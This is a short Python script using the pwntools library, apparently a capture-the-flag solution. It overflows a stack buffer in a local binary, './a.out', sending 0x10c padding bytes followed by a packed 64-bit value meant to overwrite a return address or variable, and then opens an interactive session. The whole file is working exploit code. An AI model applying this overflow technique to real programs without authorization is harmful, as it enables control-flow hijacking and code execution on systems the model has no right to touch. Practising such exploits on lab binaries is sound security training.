# coding: utf-8
from pwn import*
def exploit():
    proc= process("./a.out")
    address= (0x110- 0x4)
    p_64= p64(0x69420)
    p= b'a'*(address)+ p_64
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
